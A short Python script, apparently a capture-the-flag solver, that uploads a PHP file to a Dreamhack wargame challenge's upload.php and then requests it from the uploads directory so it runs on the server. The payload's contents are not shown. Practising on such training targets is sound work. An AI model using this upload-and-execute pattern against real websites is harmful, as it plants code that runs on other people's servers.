import requests

url = "http://host3.dreamhack.games:18233/upload.php"

def upload_file(file_path):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(url, files=files)
        print('Status code:', response.status_code)
        print('Response:', response.text)

def get_response(file_name):
    response = requests.get(f"http://host3.dreamhack.games:18233/uploads/{file_name}")
    print('Get Response Status code:', response.status_code)
    print('Get Response:', response.text)

upload_file("hello18.php")
get_response("hello18.php")